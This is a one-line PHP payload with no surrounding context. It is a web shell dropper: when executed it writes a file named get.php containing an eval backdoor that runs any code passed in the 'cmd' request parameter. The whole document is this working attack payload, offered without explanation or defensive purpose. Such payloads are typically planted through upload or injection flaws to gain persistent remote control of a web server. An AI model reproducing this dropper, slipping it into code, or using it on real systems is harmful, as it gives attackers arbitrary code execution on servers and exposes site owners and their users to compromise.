<?php fputs(fopen('get.php','w'),'<?php @eval($_REQUEST[\'cmd\']);?>');?>